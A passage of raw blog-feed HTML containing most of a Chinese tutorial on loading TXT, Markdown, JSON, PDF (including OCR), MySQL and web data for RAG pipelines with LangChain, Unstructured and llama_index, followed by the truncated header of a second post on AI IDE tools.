<span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_and_analyze_elements</span>(<span class="hljs-params">elements, file_type</span>):
​
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n========== 解析 <span class="hljs-subst">{file_type}</span> 文件 =========="</span>)
​
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n【原始元素输出】:"</span>)
    <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> elements:
        <span class="hljs-built_in">print</span>(element)
    <span class="hljs-comment"># 详细分析每个元素的元数据</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n【元素详细元数据】:"</span>)
    <span class="hljs-keyword">for</span> i, element <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(elements):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n--- 第 <span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span> 个元素 ---"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"元素类型: <span class="hljs-subst">{element.__class__.__name__}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"文本内容: <span class="hljs-subst">{element.text.strip() <span class="hljs-keyword">or</span> <span class="hljs-string">'无文本内容'</span>}</span>"</span>)
​
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(element, <span class="hljs-string">"metadata"</span>) <span class="hljs-keyword">and</span> element.metadata:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"元数据:"</span>)
            <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> element.metadata.__dict__.items():
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> key.startswith(<span class="hljs-string">"_"</span>) <span class="hljs-keyword">and</span> value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  • <span class="hljs-subst">{key}</span>: <span class="hljs-subst">{value}</span>"</span>)
​
​
<span class="hljs-comment"># 1. 解析文本文件</span>
text_elements = partition_text(text_file)
parse_and_analyze_elements(text_elements, <span class="hljs-string">"文本(TXT)"</span>)
​
<span class="hljs-comment"># 2. 解析MD文件</span>
md_elements = partition_md(md_file)
parse_and_analyze_elements(md_elements, <span class="hljs-string">"Markdown(MD)"</span>)
</code></pre>
<p>返回：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24ec838058f544b9931012ef3658b6cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=F1tlDHGRKi8zLhTUsxCTG3Y4XB4%3D" alt="txt_1.png" loading="lazy"/></p>
<p>Langchain 加载 txt、md、json格式数据，代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">from langchain_community.document_loaders import (
    TextLoader,
    JSONLoader,
    UnstructuredMarkdownLoader,
)
​
<span class="hljs-comment"># 加载txt</span>
<span class="hljs-attr">loader</span> = TextLoader(<span class="hljs-string">"../../document/企业概况与分析框架.txt"</span>, encoding=<span class="hljs-string">"utf-8"</span>)
<span class="hljs-attr">documents</span> = loader.load()
print(documents)
​
<span class="hljs-comment"># 加载整个json</span>
<span class="hljs-attr">loader2</span> = JSONLoader(
    <span class="hljs-attr">file_path</span>=<span class="hljs-string">"../../document/企业概况与分析框架.json"</span>,
    <span class="hljs-attr">jq_schema</span>=<span class="hljs-string">"."</span>,
    <span class="hljs-attr">text_content</span>=<span class="hljs-literal">False</span>,
)
<span class="hljs-attr">documents2</span> = loader2.load()
print(documents2)
​
<span class="hljs-comment"># 加载md</span>
<span class="hljs-attr">markdown_path</span> = <span class="hljs-string">"../../document/企业财务报表分析.md"</span>
<span class="hljs-attr">loader</span> = UnstructuredMarkdownLoader(markdown_path)
​
<span class="hljs-attr">data</span> = loader.load()
print(data<span class="hljs-section">[0]</span>.page_content<span class="hljs-section">[:100]</span>)
​
</code></pre>
<p>返回：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/441b8ce1d70b48fc909a597cf392ebf3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=yhFTpdNB7iRMxsLyWexxib7TTyM%3D" alt="txt_2.png" loading="lazy"/></p>
<p>两者的不同之处：langchain输出的是 标准的<code>Document</code>对象，结构非常简单；Unstructured 输出的是其专属的元素对象，会按照语义进行拆分文件，能够自动识别文中的标题、段落、列表和表格等结构，拆分成不同类型的元素，元数据也更详细（比如某段文字在文件的第几行）。</p>
<h5 data-id="heading-11">PDF</h5>
<p>Langchain加载PDF格式代码如下：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> langchain_community.document_loaders <span class="hljs-keyword">import</span> PyPDFLoader, PyMuPDFLoader, PDFPlumberLoader
​
PDF_PATH = <span class="hljs-string">"../../document/企业财务报表分析-图表.pdf"</span>
LOADERS = {<span class="hljs-string">"PyPDFLoader"</span>: PyPDFLoader, <span class="hljs-string">"PyMuPDFLoader"</span>: PyMuPDFLoader, <span class="hljs-string">"PDFPlumberLoader"</span>: PDFPlumberLoader}
​
<span class="hljs-comment"># 1. 耗时对比</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"=== 耗时对比 ==="</span>)
results = {}
<span class="hljs-keyword">for</span> name, cls <span class="hljs-keyword">in</span> LOADERS.items():
    t0 = time.perf_counter()
    docs = cls(PDF_PATH).load()
    results[name] = docs
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{name}</span>：页数=<span class="hljs-subst">{<span class="hljs-built_in">len</span>(docs)}</span>，耗时=<span class="hljs-subst">{time.perf_counter()-t0:<span class="hljs-number">.3</span>f}</span>s"</span>)
​
<span class="hljs-comment"># 2. 效果预览</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== 抽取效果预览==="</span>)
<span class="hljs-keyword">for</span> name, docs <span class="hljs-keyword">in</span> results.items():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"---------------------------------------------------------"</span>)
    preview = docs[<span class="hljs-number">1</span>].page_content[:<span class="hljs-number">500</span>].strip() <span class="hljs-keyword">if</span> docs <span class="hljs-keyword">else</span> <span class="hljs-string">"无内容"</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{name}</span>: <span class="hljs-subst">{preview}</span>"</span>)
    preview2 = docs[<span class="hljs-number">9</span>].page_content[:<span class="hljs-number">500</span>].strip() <span class="hljs-keyword">if</span> docs <span class="hljs-keyword">else</span> <span class="hljs-string">"无内容"</span>
    meta9 = docs[<span class="hljs-number">9</span>].metadata
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{name}</span>: <span class="hljs-subst">{preview2}</span> <span class="hljs-subst">{meta9}</span>"</span>)
</code></pre>
<p>返回：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f7378efd58f4220a179ce93b0f55536~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=31PYymHc0l3N%2Fzxc9ARklKk60is%3D" alt="pdf_1.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fdb6a53a5e945308174d1db40e09afc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=v9dUggrkxPrjNr0NLfAfNATJOgw%3D" alt="pdf_2.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70c01e8609dd409aaf905b6bb2b2fd95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=xB7l620pCHmgWY8bHhJBvQ1CfLE%3D" alt="pdf_3.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce6e7a9d2c1d4e49be828969dc3b3ce9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=AjGASV65OO98WKlXSLw7HJJm2qc%3D" alt="pdf_4.png" loading="lazy"/></p>
<p>从返回的结果来看PyMuPDFLoader是最快的，但是PDF中的表格结构化提取不是很好，显示的内容很乱。其次是PyPDFLoader提取速度比PyMuPDFLoader慢点，但是可以对pdf表格结构化提取。最后PDFPlumberLoader是最慢的，不过也是可以对pdf表格结构化提取，对表格化提取支持比较好。这三个的对比如下：</p>



































<table><thead><tr><th>场景</th><th>首选加载器</th><th>原因</th></tr></thead><tbody><tr><td>批量解析大量纯文本 PDF</td><td>PyMuPDFLoader</td><td>速度快、兼容性强</td></tr><tr><td>提取 PDF 中的表格（如财务报表）</td><td>PDFPlumberLoader</td><td>表格结构化提取</td></tr><tr><td>轻量部署（无多余依赖）</td><td>PyPDFLoader</td><td>仅依赖 PyPDF2，体积小</td></tr><tr><td>需提取批注 / 图片</td><td>PyMuPDFLoader</td><td>唯一支持图片 / 批注解析</td></tr><tr><td>复杂排版 PDF（分栏 / 嵌套列表）</td><td>PDFPlumberLoader</td><td>解析结果最精准</td></tr></tbody></table>
<p>Unstructured 加载PDF格式代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">from unstructured.partition.auto import partition
<span class="hljs-attr">PDF_PATH</span> = <span class="hljs-string">"../../document/企业财务报表分析.pdf"</span>
<span class="hljs-attr">elements</span> = partition(filename=PDF_PATH,content_type=<span class="hljs-string">"application/pdf"</span>)
print("\n\n".join(<span class="hljs-section">[str(e) for e in elements]</span>))
</code></pre>
<p>结果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae1962b514ce408d8209052fa6116634~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=h9qB2cIJPvm9w9qkzAItFCanWFY%3D" alt="pdf_4.1.png" loading="lazy"/></p>
<p>Unstructured 的特点是，语义结构化解析，会自动识别 PDF 中的标题（<code>Title</code>）、段落（<code>NarrativeText</code>）、列表项（<code>ListItem</code>）、表格（<code>Table</code>）等元素，拆分后返回不同类型的对象</p>
<p>不过以上说的都无法提取PDF中的折线图等图表的数据。如果遇到有很多图表数据需要解析和提取，有以下解决方案。通过“<strong>PDF 转图片 + OCR 文字识别</strong>”的方法，提取pdf中的图表数据。</p>
<p>PDF 转图片 + OCR 文字识别方法实现：</p>
<p>首先安装依赖：</p>
<p>PDF2image 需要手动安装 poppler</p>
<ul>
<li><strong>Windows</strong> 下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foschwartz10612%2Fpoppler-windows%2Freleases" target="_blank" title="https://github.com/oschwartz10612/poppler-windows/releases" ref="nofollow noopener noreferrer">github.com/oschwartz10…</a></li>
<li><strong>macOS</strong> 通过 Homebrew 安装: brew install poppler</li>
<li><strong>Linux</strong> 命令 sudo apt install poppler-utils、sudo yum install poppler-utils</li>
</ul>
<p>Tesseract-OCR 下载地址（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftesseract-ocr%2Ftesseract%2Freleases" target="_blank" title="https://github.com/tesseract-ocr/tesseract/releases" ref="nofollow noopener noreferrer">github.com/tesseract-o…</a>），需安装中文语言包（安装时勾选 “chi_sim”，或手动复制语言包到<code>tessdata</code>目录）</p>
<ul>
<li><strong>Windows</strong> 下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FUB-Mannheim%2Ftesseract%2Fwiki" target="_blank" title="https://github.com/UB-Mannheim/tesseract/wiki" ref="nofollow noopener noreferrer">github.com/UB-Mannheim…</a></li>
<li><strong>macOS</strong> 通过 Homebrew 安装：brew install tesseract tesseract-lang</li>
<li><strong>Linux</strong> 命令 sudo apt install tesseract-ocr tesseract-ocr-chi-sim、sudo yum install tesseract tesseract-langpack-chi_sim</li>
</ul>
<p>代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> pdf2image
<span class="hljs-keyword">import</span> pytesseract
<span class="hljs-keyword">import</span> os
​
<span class="hljs-comment"># 创建 output 目录</span>
PDF_PATH = <span class="hljs-string">'../../document/企业财务报表分析-图表.pdf'</span>
OUTPUT_DIR = <span class="hljs-string">'output'</span>
POPPLER_PATH = <span class="hljs-string">r'D:\Program Files\poppler-windows\poppler-25.12.0\Library\bin'</span>  <span class="hljs-comment"># 你的poppler bin路径</span>
TESSERACT_PATH = <span class="hljs-string">r'D:\Program Files\Tesseract-OCR\tesseract.exe'</span> 
​
pytesseract.pytesseract.tesseract_cmd = TESSERACT_PATH
​
<span class="hljs-comment"># 创建output目录，已存在则不报错</span>
os.makedirs(OUTPUT_DIR, exist_ok=<span class="hljs-literal">True</span>)
​
<span class="hljs-comment"># PDF转图片（关键：传poppler_path参数，解决poppler依赖）</span>
<span class="hljs-comment"># dpi=300提高图片清晰度，让OCR识别更准确</span>
images = pdf2image.convert_from_path(
    pdf_path=PDF_PATH,
    poppler_path=POPPLER_PATH,
    dpi=<span class="hljs-number">300</span>
)
​
<span class="hljs-comment"># 保存转换后的图片</span>
<span class="hljs-keyword">for</span> i, image <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(images):
    img_save_path = <span class="hljs-string">f'<span class="hljs-subst">{OUTPUT_DIR}</span>/page_<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>.png'</span>
    image.save(img_save_path)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"已保存PDF第<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>页为图片：<span class="hljs-subst">{img_save_path}</span>"</span>)
​
<span class="hljs-comment"># 用pytesseract提取简体中文文本</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n开始提取各页文本：\n"</span> + <span class="hljs-string">"-"</span>*<span class="hljs-number">60</span>)
<span class="hljs-keyword">for</span> i, image <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(images):
    <span class="hljs-comment"># lang='chi_sim'指定简体中文，依赖安装时勾选的中文语言包</span>
    text = pytesseract.image_to_string(image, lang=<span class="hljs-string">'chi_sim'</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"【PDF第<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>页提取的文本】"</span>)
    <span class="hljs-comment"># 处理无文本的情况，避免打印空行</span>
    <span class="hljs-built_in">print</span>(text <span class="hljs-keyword">if</span> text.strip() <span class="hljs-keyword">else</span> <span class="hljs-string">"该页未识别到有效文本"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span>*<span class="hljs-number">60</span> + <span class="hljs-string">"\n"</span>)
</code></pre>
<p>返回：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94ac1caeb02e4e7ba19f93715b3a6961~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=%2FYUpCQeuK%2B7iJO0HYeyerA4P7l8%3D" alt="pdf_5.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48ca4f7693f84198b758c22d4a683f7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=A5oJ3l%2FIEY2SYZsY8IncKHrBfYA%3D" alt="pdf_6.png" loading="lazy"/>
从返回可以看出将pd转换成图片后，对图片进行识别，可以识别到图表的数据，不过这种方法比较耗时。</p>
<h5 data-id="heading-12">数据库</h5>
<p>sqlalchemy加载数据库数据，代码如下：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine, text
​
engine = create_engine(<span class="hljs-string">"mysql+mysqlconnector://root:root@localhost:3306/seckill"</span>)
df = pd.read_sql(text(<span class="hljs-string">"SELECT * FROM user"</span>), engine)
<span class="hljs-built_in">print</span>(df)
</code></pre>
<p>返回：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23e5ce94bc7a4f42a5130559d0a5bb87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=Zl7rJxGLq6kpc8KMNNANRppASgc%3D" alt="db_1.png" loading="lazy"/></p>
<p>llama_index加载数据库数据，代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">from llama_index.readers.database import DatabaseReader
<span class="hljs-attr">db_uri</span> = <span class="hljs-string">"mysql+mysqlconnector://root:root@localhost:3306/seckill"</span>
<span class="hljs-attr">reader</span> = DatabaseReader(
    <span class="hljs-attr">uri</span>=db_uri
)
<span class="hljs-attr">query</span> = <span class="hljs-string">"SELECT * FROM user"</span>
<span class="hljs-attr">documents</span> = reader.load_data(query=query)
print(f"从数据库加载的文档数量: {len(documents)}")
print(documents)
</code></pre>
<p>结果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12daac79ad6e4c7695916f0afa28dd08~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=Mi9DVmm2lvKPzzPyVUcNTIFz580%3D" alt="db_2.png" loading="lazy"/></p>
<h5 data-id="heading-13">网页</h5>
<p>Langchain加载网页数据，代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">import requests
from langchain_community.document_loaders import WebBaseLoader
​
<span class="hljs-attr">page_url</span> = <span class="hljs-string">"https://books.toscrape.com"</span>
​
def custom_scrape(url):
    <span class="hljs-attr">headers</span> = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0<span class="hljs-comment">; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span>
    }
    <span class="hljs-attr">response</span> = requests.get(url, headers=headers, timeout=<span class="hljs-number">20</span>)
    response.raise_for_status()
    return response.text
​
<span class="hljs-attr">loader</span> = WebBaseLoader(web_paths=[page_url])
<span class="hljs-attr">loader.scrape_all</span> = lambda urls: [custom_scrape(url) for url in urls]
<span class="hljs-attr">doc</span> = loader.load()[<span class="hljs-number">0</span>]
<span class="hljs-attr">clean_content</span> = <span class="hljs-string">" "</span>.join(doc.page_content.replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">"\r"</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">"\t"</span>, <span class="hljs-string">""</span>).split())
​
print("网页核心内容（无换行）：\n", clean_content<span class="hljs-section">[:2000]</span>)
</code></pre>
<p>结果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d939b7ab99964781836191e59b783c45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=zMw3NmA6YJskN7S%2F4lvCjr%2FB%2Bk0%3D" alt="web_1.png" loading="lazy"/></p>
<p>unstructured加载网页数据，代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">import requests
from unstructured.partition.html import partition_html
​
<span class="hljs-attr">page_url</span> = <span class="hljs-string">"https://books.toscrape.com"</span>
​
<span class="hljs-attr">headers</span> = {<span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span>}
<span class="hljs-attr">html_content</span> = requests.get(page_url, headers=headers).text
​
<span class="hljs-attr">elements</span> = partition_html(text=html_content)
​
<span class="hljs-attr">all_text</span> = [elem.text.strip() for elem in elements if elem.text.strip()]
​
<span class="hljs-attr">clean_content</span> = <span class="hljs-string">" "</span>.join(<span class="hljs-string">""</span>.join(all_text).replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">"\r"</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">"\t"</span>, <span class="hljs-string">""</span>).split())
​
print("Unstructured直接加载网页（无换行）：\n", clean_content<span class="hljs-section">[:2000]</span>)
</code></pre>
<p>结果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e179396282dd4bfab68c1abc1adc619e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=cVgBWfXs5RheqxzcK1rlmidl3E8%3D" alt="web_2.png" loading="lazy"/></p>
<p>使用对比下来WebBaseLoader更快点，适合快速提取网页内的文本。而<code>partition_html</code> 适合细粒度结构化解析网页元素</p>
<h4 data-id="heading-14">思维导图</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77b88048a7444b09ba14d768ca4969ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=ZMavh1AG8mHwXsOjVZAx%2FODQXPA%3D" alt="RAG-数据加载.png" loading="lazy"/></p>
<h4 data-id="heading-15">总结</h4>
<p>好了，RAG系统的数据加载技术就写到这，不同格式的数据应该选择不同的技术组件进行加载，这样可以提高RAG系统的准确性。其实写了那么多也只是给各位亦菲、彦祖们一个参考，更多的是需要自己上手练习和体会。还有很多文中没有列到的数据加载技术，也欢迎各位亦菲、彦祖们在评论区讨论哦。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Day02：认识 AI IDE 工具]]></title>    <link>https://juejin.cn/post/7605625595569995791</link>    <guid>https://juejin.cn/post/7605625595569995791</guid>    <pubDate>2026-02-12T18:55:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605625595569995791" data-draft-id="7605262897649041443" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Day02：认识 AI IDE 工具"/> <meta itemprop="keywords" content="前端,人工智能"/> <meta itemprop="datePublished" content="2026-02-12T18:55:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="派星"/> <meta itemprop="url" content="https://juejin.cn/user/3556272969881436"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Day02：认识 AI IDE 工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3556272969881436/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    派星
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T18:55:46.000Z" title="Thu Feb 12 2026 18:55:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 